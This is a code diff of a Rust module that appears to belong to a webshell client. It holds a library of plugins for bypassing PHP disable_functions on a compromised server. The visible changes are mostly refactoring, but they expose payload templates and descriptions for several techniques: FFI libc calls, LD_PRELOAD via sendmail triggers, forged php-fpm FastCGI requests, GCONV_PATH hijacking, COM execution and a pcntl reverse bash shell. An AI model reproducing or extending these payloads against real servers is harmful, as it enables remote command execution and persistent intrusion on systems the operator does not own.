@@ -1,7 +1,6 @@
 //! Bypass Disable Functions 向量库：每个绕过方式独立插件，可手动选择测试。
 //! 公共辅助：环境检测 / 命令执行结果包装 / PHP 载荷模板。
 
-use base64::Engine;
 use crate::domain::AppSettings;
 use crate::plugin::{FeatureManifest, FeaturePlugin, ParamSpec};
 use crate::protocol::{Protocol, ProtocolError, SessionState};
@@ -16,19 +15,6 @@ pub(crate) fn cmd_of(params: &serde_json::Value) -> String {
         .and_then(|v| v.as_str())
         .unwrap_or("id")
         .to_string()
-}
-
-/// 包装执行结果：成功 {ok, output(base64)}；失败 {ok, error}。
-pub(crate) fn result_json(ok: bool, output: &str, error: &str) -> serde_json::Value {
-    if ok {
-        serde_json::json!({
-            "ok": true,
-            "output": base64::engine::general_purpose::STANDARD.encode(output.as_bytes()),
-            "output_text": output,
-        })
-    } else {
-        serde_json::json!({ "ok": false, "error": error })
-    }
 }
 
 /// 执行 PHP 载荷并解析 JSON 结果。
@@ -116,7 +102,9 @@ impl FeaturePlugin for BypassScanPlugin {
             id: "bypass_scan".into(),
             name: "Bypass 环境检测".into(),
             version: "1.0.0".into(),
-            description: "评估 disable_functions 环境：禁用清单 + 各绕过向量可用性（先跑这个再选向量）。".into(),
+            description:
+                "评估 disable_functions 环境：禁用清单 + 各绕过向量可用性（先跑这个再选向量）。"
+                    .into(),
             category: "php".into(),
             languages: vec!["php".into()],
             params: vec![],
@@ -141,13 +129,6 @@ impl FeaturePlugin for BypassScanPlugin {
     }
 }
 
-/// 执行命令并读取输出文件的通用 PHP 模板片段。
-pub(crate) fn read_out_tail() -> &'static str {
-    r#"$o = file_exists($of) ? @file_get_contents($of) : '';
-@unlink($of);
-"#
-}
-
 // ---------------------------------------------------------------------------
 // 向量 1：bypass_syscall —— 直接使用可用的命令执行函数
 // ---------------------------------------------------------------------------
@@ -160,7 +141,9 @@ impl FeaturePlugin for BypassSyscallPlugin {
             id: "bypass_syscall".into(),
             name: "Bypass·直接系统调用".into(),
             version: "1.0.0".into(),
-            description: "直接用可用的命令执行函数（exec/system/passthru/popen/proc_open/shell_exec 任一）。".into(),
+            description:
+                "直接用可用的命令执行函数（exec/system/passthru/popen/proc_open/shell_exec 任一）。"
+                    .into(),
             category: "php".into(),
             languages: vec!["php".into()],
             params: command_param(vec![]),
@@ -199,7 +182,7 @@ echo json_encode(array('ok' => $done, 'used' => $done ? 'available' : 'all disab
     'output_text' => $done ? $o : null,
     'error' => $done ? null : '全部命令执行函数均被禁用'));
 "#,
-            cmd = serde_json::to_string(&cmd).unwrap_or_else(|_| "\"id\"".to_string()),
+            cmd = crate::feature_plugins::php_json_str(&cmd),
             out = BYPASS_OUT,
         );
         run_payload(protocol, session, &code, settings)
@@ -218,7 +201,8 @@ impl FeaturePlugin for BypassFfiPlugin {
             id: "bypass_ffi".into(),
             name: "Bypass·FFI".into(),
             version: "1.0.0".into(),
-            description: "FFI::cdef 加载 libc 调用 popen/system（PHP 7.4+ 且启用 FFI，无需编译器）。".into(),
+            description:
+                "FFI::cdef 加载 libc 调用 popen/system（PHP 7.4+ 且启用 FFI，无需编译器）。".into(),
             category: "php".into(),
             languages: vec!["php".into()],
             params: command_param(vec![]),
@@ -273,7 +257,7 @@ try {{
     echo json_encode(array('ok' => false, 'error' => $e->getMessage()));
 }}
 "#,
-            cmd = serde_json::to_string(&cmd).unwrap_or_else(|_| "\"id\"".to_string()),
+            cmd = crate::feature_plugins::php_json_str(&cmd),
             out = BYPASS_OUT,
         );
         run_payload(protocol, session, &code, settings)
@@ -336,7 +320,7 @@ if (function_exists('pcntl_fork') && function_exists('pcntl_exec') && function_e
 }}
 echo json_encode(array('ok' => false, 'error' => 'pcntl_exec/pcntl_fork/pcntl_waitpid 不可用'));
 "#,
-            cmd = serde_json::to_string(&cmd).unwrap_or_else(|_| "\"id\"".to_string()),
+            cmd = crate::feature_plugins::php_json_str(&cmd),
             out = BYPASS_OUT,
         );
         run_payload(protocol, session, &code, settings)
@@ -366,7 +350,9 @@ impl FeaturePlugin for BypassLdPreloadPlugin {
             id: "bypass_ld_preload".into(),
             name: "Bypass·LD_PRELOAD".into(),
             version: "1.0.0".into(),
-            description: "现场编译 .so（需 gcc）+ putenv LD_PRELOAD + mail/error_log 触发 sendmail 执行。".into(),
+            description:
+                "现场编译 .so（需 gcc）+ putenv LD_PRELOAD + mail/error_log 触发 sendmail 执行。"
+                    .into(),
             category: "php".into(),
             languages: vec!["php".into()],
             params: command_param(vec![ParamSpec {
@@ -399,7 +385,9 @@ impl FeaturePlugin for BypassLdPreloadPlugin {
         let trigger_php = match trigger {
             "mail" => "if (function_exists('mail')) { @mail('a@b.c', '', ''); }",
             "error_log" => "if (function_exists('error_log')) { @error_log('', 1); }",
-            _ => "if (function_exists('mail')) { @mail('a@b.c', '', ''); } else { @error_log('', 1); }",
+            _ => {
+                "if (function_exists('mail')) { @mail('a@b.c', '', ''); } else { @error_log('', 1); }"
+            }
         };
         let code = format!(
             r#"<?php
@@ -444,7 +432,7 @@ echo json_encode(array('ok' => true,
     'output' => base64_encode((string)$output), 'output_text' => (string)$output,
     'compiler' => $cc, 'sendmail' => $sendmail));
 "#,
-            cmd = serde_json::to_string(&cmd).unwrap_or_else(|_| "\"id\"".to_string()),
+            cmd = crate::feature_plugins::php_json_str(&cmd),
             out = BYPASS_OUT,
             trigger = trigger_php,
         )
@@ -465,7 +453,9 @@ impl FeaturePlugin for BypassComPlugin {
             id: "bypass_com".into(),
             name: "Bypass·COM(Windows)".into(),
             version: "1.0.0".into(),
-            description: "Windows 下用 COM 组件 WScript.Shell 执行命令（php.ini 需启用 com.allow_dcom）。".into(),
+            description:
+                "Windows 下用 COM 组件 WScript.Shell 执行命令（php.ini 需启用 com.allow_dcom）。"
+                    .into(),
             category: "php".into(),
             languages: vec!["php".into()],
             params: command_param(vec![]),
@@ -505,7 +495,7 @@ try {{
     echo json_encode(array('ok' => false, 'error' => $e->getMessage()));
 }}
 "#,
-            cmd = serde_json::to_string(&cmd).unwrap_or_else(|_| "\"id\"".to_string()),
+            cmd = crate::feature_plugins::php_json_str(&cmd),
             out = BYPASS_OUT,
         );
         run_payload(protocol, session, &code, settings)
@@ -577,7 +567,7 @@ echo json_encode(array('ok' => $result !== null && $result !== false,
     'method' => $method, 'output' => base64_encode((string)$result), 'output_text' => (string)$result,
     'error' => $method === null ? '无可用老版本 eval 函数（assert/create_function/preg-e）' : null));
 "#,
-            code = serde_json::to_string(&code).unwrap_or_else(|_| "\"echo 'x';\"".to_string()),
+            code = crate::feature_plugins::php_json_str(&code),
         );
         run_payload(protocol, session, &payload, settings)
     }
@@ -595,7 +585,8 @@ impl FeaturePlugin for BypassDlPlugin {
             id: "bypass_dl".into(),
             name: "Bypass·dl 动态加载".into(),
             version: "1.0.0".into(),
-            description: "dl() 动态加载预编译扩展（需已存在 .so 路径；现代 PHP 多数环境已禁 dl）。".into(),
+            description: "dl() 动态加载预编译扩展（需已存在 .so 路径；现代 PHP 多数环境已禁 dl）。"
+                .into(),
             category: "php".into(),
             languages: vec!["php".into()],
             params: vec![ParamSpec {
@@ -641,7 +632,7 @@ $ok = @dl($ext);
 echo json_encode(array('ok' => $ok, 'extension' => $ext,
     'error' => $ok ? null : 'dl() 加载失败（路径无效或环境禁用）'));
 "#,
-            ext = serde_json::to_string(&extension).unwrap_or_else(|_| "\"\"".to_string()),
+            ext = crate::feature_plugins::php_json_str(&extension),
         );
         run_payload(protocol, session, &code, settings)
     }
@@ -659,7 +650,9 @@ impl FeaturePlugin for BypassFastcgiPlugin {
             id: "bypass_fastcgi".into(),
             name: "Bypass·FPM 未授权".into(),
             version: "1.0.0".into(),
-            description: "探测 php-fpm unix socket/9000 端口，伪造 FCGI 请求（auto_prepend_file）执行代码。".into(),
+            description:
+                "探测 php-fpm unix socket/9000 端口，伪造 FCGI 请求（auto_prepend_file）执行代码。"
+                    .into(),
             category: "php".into(),
             languages: vec!["php".into()],
             params: vec![
@@ -773,8 +766,8 @@ echo json_encode(array('ok' => strlen($out) > 0, 'target' => $found,
     'output' => base64_encode($out), 'output_text' => $out,
     'error' => strlen($out) === 0 ? 'FPM 无响应（可能未授权或配置拒绝）' : null));
 "#,
-            code = serde_json::to_string(&code).unwrap_or_else(|_| "\"system('id');\"".to_string()),
-            socket = serde_json::to_string(&socket).unwrap_or_else(|_| "\"\"".to_string()),
+            code = crate::feature_plugins::php_json_str(&code),
+            socket = crate::feature_plugins::php_json_str(&socket),
         );
         run_payload(protocol, session, &payload, settings)
     }
@@ -806,7 +799,8 @@ impl FeaturePlugin for BypassIconvPlugin {
             id: "bypass_iconv".into(),
             name: "Bypass·GCONV_PATH".into(),
             version: "1.0.0".into(),
-            description: "PHP 7.0-7.2 iconv 劫持：编译 gconv 模块 .so，GCONV_PATH 环境注入触发执行。".into(),
+            description:
+                "PHP 7.0-7.2 iconv 劫持：编译 gconv 模块 .so，GCONV_PATH 环境注入触发执行。".into(),
             category: "php".into(),
             languages: vec!["php".into()],
             params: command_param(vec![]),
@@ -880,7 +874,7 @@ echo json_encode(array('ok' => strlen((string)$output) > 0 || $r !== false,
     'output' => base64_encode((string)$output), 'output_text' => (string)$output,
     'error' => strlen((string)$output) === 0 ? 'iconv 未触发加载（版本/glibc 差异）' : null));
 "#,
-            cmd = serde_json::to_string(&cmd).unwrap_or_else(|_| "\"id\"".to_string()),
+            cmd = crate::feature_plugins::php_json_str(&cmd),
             out = BYPASS_OUT,
         )
         .replace("__C__", ICONV_GADGET_C);
@@ -900,7 +894,9 @@ impl FeaturePlugin for BypassReversePcntlPlugin {
             id: "bypass_reverse_pcntl".into(),
             name: "Bypass·pcntl 反弹".into(),
             version: "1.0.0".into(),
-            description: "fork + pcntl_exec 反弹 bash（不依赖 proc_open/shell_exec，命令函数全禁时可用）。".into(),
+            description:
+                "fork + pcntl_exec 反弹 bash（不依赖 proc_open/shell_exec，命令函数全禁时可用）。"
+                    .into(),
             category: "php".into(),
             languages: vec!["php".into()],
             params: vec![
@@ -988,7 +984,7 @@ if ($pid > 0) {{
 }}
 echo json_encode(array('ok' => false, 'error' => 'fork 失败'));
 "#,
-            host = serde_json::to_string(&host).unwrap_or_else(|_| "\"127.0.0.1\"".to_string()),
+            host = crate::feature_plugins::php_json_str(&host),
             port = port,
             background = if background { "true" } else { "false" },
         );
